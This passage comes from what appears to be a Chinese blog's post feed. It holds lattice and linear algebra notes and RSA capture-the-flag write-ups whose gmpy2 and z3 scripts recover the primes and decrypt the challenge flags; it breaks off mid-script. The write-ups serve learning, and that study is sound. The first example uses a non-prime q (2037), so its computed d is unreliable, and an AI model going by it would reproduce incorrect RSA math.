class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">∣</span><span class="mord">∣</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span></span></span></span></span></p>
</li>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>C</mi><mi>a</mi><mi>u</mi><mi>c</mi><mi>h</mi><mi>y</mi><mo>−</mo><mi>S</mi><mi>c</mi><mi>h</mi><mi>w</mi><mi>a</mi><mi>r</mi><mi>z</mi><mtext>不等式</mtext><mo stretchy="false">)</mo><mtext>两向量的点积的绝对值，不大于向量长度的积。</mtext><mspace linebreak="newline"></mspace><mspace width="1em"/><mi mathvariant="normal">∣</mi><mi>v</mi><mo separator="true">⋅</mo><mi>w</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>v</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo separator="true">⋅</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>w</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">(Cauchy-Schwarz 不等式) 两向量的点积的绝对值，不大于向量长度的积。\\ \quad |v·w|\leq ||v||·||w||
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">a</span><span class="mord mathnormal">u</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">式</span><span class="mclose">)</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">绝</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">长</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">∣</span><span class="mord">∣</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord">∣</span><span class="mord">∣</span></span></span></span></span></p>
<p><strong>正交基 (orthogonal basis)</strong></p>
</li>
</ol>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>线性空间</mtext><mi>V</mi><mtext>的一个正交基，是满足以下条件的基</mtext><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>v</mi><mi>n</mi></msub><mtext>：</mtext><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">⋅</mo><msub><mi>v</mi><mi>j</mi></msub><mo>=</mo><mn>0</mn><mspace width="1em"/><mi mathvariant="normal">∀</mi><mi>i</mi><mo mathvariant="normal">≠</mo><mi>j</mi></mrow><annotation encoding="application/x-tex"> 线性空间V 的一个正交基，是满足以下条件的基v_1,...v_n
：v_i·v_j=0 \quad \forall i \neq j
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">间</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">交</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">基</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord">∀</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span></p>
<p>额外地，若这个基还满足 ||v||=1 ，则我们称这个基<strong>规范正交 (orthonormal)</strong>.</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/31/fced341d6ec98413.jpg" alt="" /></p>
<h2 id="lenstralenstralovasz格基规约算法"><a class="anchor" href="#lenstralenstralovasz格基规约算法">#</a> Lenstra–Lenstra–Lovasz（格基规约算法 ）</h2>
<p>在 lattice 里面找短向量的算法，称为 lattice reduction（格基规约）算法</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>格密码</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA-1</title>
    <url>/crypto/write/RSA-1/</url>
    <content><![CDATA[<p>N: 模数  p&amp;q: 大整数 N 的两个因子  e&amp;d: 互为模反数的两个指数  c 是密文 m 是明文<br />
 {N,e} 成为公钥，{N,d} 称为私钥；</p>
<p><a id="more"></a></p>
<h2 id="使用python脚本"><a class="anchor" href="#使用python脚本">#</a> 使用 python 脚本</h2>
<p><img data-src="https://i.loli.net/2021/08/16/CmQPilRKHvqTc67.png" alt="f.png" title="已知p,q,e,获取d" /></p>
<p>对于 RSA 解密有专门的 python 脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre>p<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">447685307</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>q<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">2037</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>e<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>phi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 d 的值为 53616899001<br />
<img data-src="https://i.loli.net/2021/08/16/xO4qAIwC6UD3luG.png" alt="3333.png" /></p>
<h2 id="关于gmpy2模块"><a class="anchor" href="#关于gmpy2模块">#</a> 关于 gmpy2 模块</h2>
<p>电脑上之前没有安装过 gmpy2 模块的用户可能会遇到这种情况</p>
<p><img data-src="https://i.loli.net/2021/08/16/PThL6aACnRY5td7.png" alt="微信图片_20210816211029.png" /></p>
<p>首先，我们需要给 py 先装上 wheel</p>
<p><img data-src="https://i.loli.net/2021/08/16/hzRIqs1lbSN9Km5.png" alt="微信截图_20210816211056.png" /></p>
<p>并且确定对一下自己的 python 版本，我的就是 python39；后面会用到。</p>
<p>下载 python 包的网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cubGZkLnVjaS5lZHUvfmdvaGxrZS9weXRob25saWJzLw==">点我</span><br />
这里我们选择对应的版号，download.</p>
<p><img data-src="https://i.loli.net/2021/08/16/spEnB9GlyJ7M4o5.png" alt="3.png" /></p>
<p><img data-src="https://i.loli.net/2021/08/16/ZCLeRtBGFrhaQnl.png" alt="微信图片_20210816210916.png" /></p>
<p>将安装好的路径放在 'pip install' 后</p>
<p><img data-src="https://i.loli.net/2021/08/16/ZArM8XClhSt5THe.png" alt="222.png" /></p>
<p>大功告成啦，gmpy2 模块已经安装成功了</p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA-2</title>
    <url>/crypto/write/RSA-2/</url>
    <content><![CDATA[<p>RSA 解密的入门题型<br />
<a id="more"></a><br />
 在此复盘前几日做的几道 Crypto</p>
<h2 id="where_is_my_flag"><a class="anchor" href="#where_is_my_flag">#</a> where_is_my_flag</h2>
<p>Download txt</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>p = 0xbdb8699374e4def5d3f3463e772ee20c08e1315c58bc3a762bd7df0eaa2df1411f60b76af536d98dea06f9baf1ba8e4e0e6e9e82f77128301b9402c1c3f8295f11e4334579f5c4c1349a7e1f979600ea203c1ecce035af549d29a42f3088504c09b3074e8680c2ef7b1a1076ac5f247faf539e8999bd21b89d5ab0010dd582db</pre></td></tr><tr><td data-num="2"></td><td><pre>q = 0x99c730753f5aa2a326e24c71b784351365a3f121b014879bbb218b70d6c295c549fff979a486693950b67895d8fee4bb3f3037f3c1998db33f80c4eda9a30573aa37eeb7987b7dc8ce6142b9f763006a6e70dc6e58a3848bfe127c987562aaf126ff6c9619f98242fe25018c94d35290131d77ef41be72231dbd394455ca8427</pre></td></tr><tr><td data-num="3"></td><td><pre>e = 0x10001</pre></td></tr><tr><td data-num="4"></td><td><pre>c = 0x690b7f4160011cd6ece55fd1fbf90e29c20c0c9d9528235ad986eba900cc5c30db3cb17fb99ecf0bf2a365cd3ae0e1e100e40d584ed0ff960ef8f489c8698da70718f72c96ec71acb388d232af1da54995f681ffe05440788569368a48970edfe2ef3b27dedb2c0ee2cac7d0820f58a9a26a4a33a7a1f09a1f3898589ff74ff14e4ba9e126e94fb8dbf2f8b26146924858dada87f490822226d498a55c92864eca2d0e50111d8dbff0544c5d3cffc2341737abe3897b12d1834b2a0ab3c94d1cb2e9300cdc9559a5fae7d1a5f33cd08605eb2476d775cf9faadb032de0b057d08e0b686d022e880917c844fdd19b22881a946540ca90bfc235dafb98f15e8899</pre></td></tr></table></figure><p>编写一段 python 脚本跑一下</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre>p <span class="token operator">=</span> <span class="token number">0xbdb8699374e4def5d3f3463e772ee20c08e1315c58bc3a762bd7df0eaa2df1411f60b76af536d98dea06f9baf1ba8e4e0e6e9e82f77128301b9402c1c3f8295f11e4334579f5c4c1349a7e1f979600ea203c1ecce035af549d29a42f3088504c09b3074e8680c2ef7b1a1076ac5f247faf539e8999bd21b89d5ab0010dd582db</span></pre></td></tr><tr><td data-num="3"></td><td><pre>q <span class="token operator">=</span> <span class="token number">0x99c730753f5aa2a326e24c71b784351365a3f121b014879bbb218b70d6c295c549fff979a486693950b67895d8fee4bb3f3037f3c1998db33f80c4eda9a30573aa37eeb7987b7dc8ce6142b9f763006a6e70dc6e58a3848bfe127c987562aaf126ff6c9619f98242fe25018c94d35290131d77ef41be72231dbd394455ca8427</span></pre></td></tr><tr><td data-num="4"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x10001</span></pre></td></tr><tr><td data-num="5"></td><td><pre>c <span class="token operator">=</span> <span class="token number">0x690b7f4160011cd6ece55fd1fbf90e29c20c0c9d9528235ad986eba900cc5c30db3cb17fb99ecf0bf2a365cd3ae0e1e100e40d584ed0ff960ef8f489c8698da70718f72c96ec71acb388d232af1da54995f681ffe05440788569368a48970edfe2ef3b27dedb2c0ee2cac7d0820f58a9a26a4a33a7a1f09a1f3898589ff74ff14e4ba9e126e94fb8dbf2f8b26146924858dada87f490822226d498a55c92864eca2d0e50111d8dbff0544c5d3cffc2341737abe3897b12d1834b2a0ab3c94d1cb2e9300cdc9559a5fae7d1a5f33cd08605eb2476d775cf9faadb032de0b057d08e0b686d022e880917c844fdd19b22881a946540ca90bfc235dafb98f15e8899</span></pre></td></tr><tr><td data-num="6"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="7"></td><td><pre>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/08/31/7INBE6AxODCbt25.png" alt="微信图片_20210831205621.png" /></p>
<h2 id="rsa-equation"><a class="anchor" href="#rsa-equation">#</a> RSA-Equation</h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>p+q= 0x15554bf3279b5a5ff3a6f51348840a5c77f85d649ef89fe6f6aecca3b7a4f8954d94c041b9bf9c53605e69bf381df6b1e264dbe7cf3760d816bca53bc783efd62</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>p-q= 0x277f7e82a74a5d8142ffc15b6a580535a1b64d6e4e200918902ca748abaeebaaa08b56883c6d76ebb3a53e4461cb51629b7297af887a72cdcf57f7dc77896968</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>e=0x10001</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>c= 0x545040e44624d0b2ef5dd3e389d7e3edcd0933791f7ccce390d7c8637dd7d26d5d14ecada079d839d71f6326259e9fb65e89c8a52419ed2ffee953c78f5d66335c4cadbc2c48034430a7d3ce4c468eb17c4f04cddfe271928b794048a4a59478c4261c44e7c3e8f9fd946d48620c0069a9327cb22a4c0502d1e9869991c4b922</pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>tmp1<span class="token operator">=</span><span class="token number">0x15554bf3279b5a5ff3a6f51348840a5c77f85d649ef89fe6f6aecca3b7a4f8954d94c041b9bf9c53605e69bf381df6b1e264dbe7cf3760d816bca53bc783efd62</span></pre></td></tr><tr><td data-num="6"></td><td><pre>tmp2<span class="token operator">=</span><span class="token number">0x277f7e82a74a5d8142ffc15b6a580535a1b64d6e4e200918902ca748abaeebaaa08b56883c6d76ebb3a53e4461cb51629b7297af887a72cdcf57f7dc77896968</span></pre></td></tr><tr><td data-num="7"></td><td><pre>e<span class="token operator">=</span><span class="token number">0x10001</span></pre></td></tr><tr><td data-num="8"></td><td><pre>c<span class="token operator">=</span><span class="token number">0x545040e44624d0b2ef5dd3e389d7e3edcd0933791f7ccce390d7c8637dd7d26d5d14ecada079d839d71f6326259e9fb65e89c8a52419ed2ffee953c78f5d66335c4cadbc2c48034430a7d3ce4c468eb17c4f04cddfe271928b794048a4a59478c4261c44e7c3e8f9fd946d48620c0069a9327cb22a4c0502d1e9869991c4b922</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">,</span>q <span class="token operator">=</span> Ints<span class="token punctuation">(</span><span class="token string">'p q'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p<span class="token operator">+</span>q <span class="token operator">==</span> tmp1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p<span class="token operator">-</span>q <span class="token operator">==</span> tmp2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">assert</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat</pre></td></tr><tr><td data-num="15"></td><td><pre>p <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>q <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>n <span class="token operator">=</span> q<span class="token operator">*</span>p</pre></td></tr><tr><td data-num="18"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/09/01/HFUGjlLsJDZ3dEV.png" alt="微信截图_20210901090446.png" /></p>
<h2 id="rsa-equation2"><a class="anchor" href="#rsa-equation2">#</a> RSA-Equation2</h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>n=16917955357177705838022522227269189799965442955600174230088241413537748036079610427667748524760416412487661588166675433898394627618977795412467578931925290358440662780942041112815203687805808800979128075090221137838151372846654787093946656482304031633775358207228010135390832522575861986102844835573116079075374771222923318301544600822685589433165393483870570768619713138725020836976344994143665005213595439734053715247430701190483139697651308683944225607919788529538100719847326451607419315958484481451634531624954226369336218518430937719669057217473641902380243356961565889376657557909528540953750939711249576195159</pre></td></tr><tr><td data-num="2"></td><td><pre>e=65537</pre></td></tr><tr><td data-num="3"></td><td><pre>p+q=267250288454671020661183002864902079825043927948084290018881840749593744112726102797024780930797632709553108642750613400441660075135953435838879572761149456222440690951092454409936578252836007774319573115773705552877746875261145722418936676843582728011234303760521211480177882717639401447544081327143079896120</pre></td></tr><tr><td data-num="4"></td><td><pre>c=5556174183094477266451814135598079847549101214607407493539824119455757033446976990042962516935280719453306508436587735802442820646417947364018203517042867867234303222841927154859105937645608430659139623801595899283410063126536085399147208144097197880122970573526524116735044315018453029904516767525608508679020577616271754886842387942346107665596391743557339734244348287686755256712318046694093530306203491446373883714768977770886274094556846171675194528687326913219088784425334478253460076116644849541623671796578618297488203818462587973285321935678023132310392911491050341349681920275418686930590504234068089136064</pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>tmp1<span class="token operator">=</span><span class="token number">267250288454671020661183002864902079825043927948084290018881840749593744112726102797024780930797632709553108642750613400441660075135953435838879572761149456222440690951092454409936578252836007774319573115773705552877746875261145722418936676843582728011234303760521211480177882717639401447544081327143079896120</span></pre></td></tr><tr><td data-num="6"></td><td><pre>tmp2<span class="token operator">=</span><span class="token number">16917955357177705838022522227269189799965442955600174230088241413537748036079610427667748524760416412487661588166675433898394627618977795412467578931925290358440662780942041112815203687805808800979128075090221137838151372846654787093946656482304031633775358207228010135390832522575861986102844835573116079075374771222923318301544600822685589433165393483870570768619713138725020836976344994143665005213595439734053715247430701190483139697651308683944225607919788529538100719847326451607419315958484481451634531624954226369336218518430937719669057217473641902380243356961565889376657557909528540953750939711249576195159</span></pre></td></tr><tr><td data-num="7"></td><td><pre>e<span class="token operator">=</span><span class="token number">65537</span></pre></td></tr><tr><td data-num="8"></td><td><pre>c<span class="token operator">=</span><span class="token number">5556174183094477266451814135598079847549101214607407493539824119455757033446976990042962516935280719453306508436587735802442820646417947364018203517042867867234303222841927154859105937645608430659139623801595899283410063126536085399147208144097197880122970573526524116735044315018453029904516767525608508679020577616271754886842387942346107665596391743557339734244348287686755256712318046694093530306203491446373883714768977770886274094556846171675194528687326913219088784425334478253460076116644849541623671796578618297488203818462587973285321935678023132310392911491050341349681920275418686930590504234068089136064</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>p<span class="token punctuation">,</span>q <span class="token operator">=</span> Ints<span class="token punctuation">(</span><span class="token string">'p q'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p<span class="token operator">+</span>q <span class="token operator">==</span> tmp1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>p<span class="token operator">*</span>q <span class="token operator">==</span> tmp2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">assert</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat</pre></td></tr><tr><td data-num="15"></td><td><pre>p <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>q <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token 